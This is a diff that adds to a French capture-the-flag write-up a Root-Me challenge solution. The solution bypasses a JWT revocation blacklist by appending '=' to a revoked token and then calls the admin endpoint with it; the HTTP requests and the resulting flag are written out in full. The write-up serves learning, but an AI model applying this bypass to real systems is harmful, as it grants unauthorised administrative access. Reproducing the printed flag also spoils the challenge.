@@ -565,4 +565,54 @@ Puis sur Deliver to victim.
 Le serveur victime charge mon exploit → requête POST sans Referer → email modifié.
 
 🎉 Challenge résolu.
+## Challenge 6 – JWT Révoqué
+Exploitation
+Étape 1 — Login pour obtenir un token
 
+Requête :
+```
+POST /web-serveur/ch63/login HTTP/1.1
+Host: challenge01.root-me.org
+Content-Type: application/json
+
+{"username":"admin","password":"admin"}
+```
+(image)
+
+Réponse  :
+
+{
+  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...."
+}
+
+
+➡️ Copier ce token.
+Étape 2 — Modifier le token pour contourner la blacklist
+
+Il suffit d'ajouter un = à la fin :
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....=
+
+
+Ce token :
+
+n'est plus dans la blacklist
+
+mais reste valide pour la librairie JWT utilisée
+
+Étape 3 — Appel de /admin avec le token modifié
+```
+GET /web-serveur/ch63/admin HTTP/1.1
+Host: challenge01.root-me.org
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9....=
+```
+🏁 4. Résultat
+
+Le serveur renvoie :
+
+{
+  "Congratzzzz!!!_flag:": "Do_n0t_r3v0k3_3nc0d3dT0k3nz_M4am3ne-U53_th3_JTI_field"
+}
+
+
+➡️ Challenge validé.
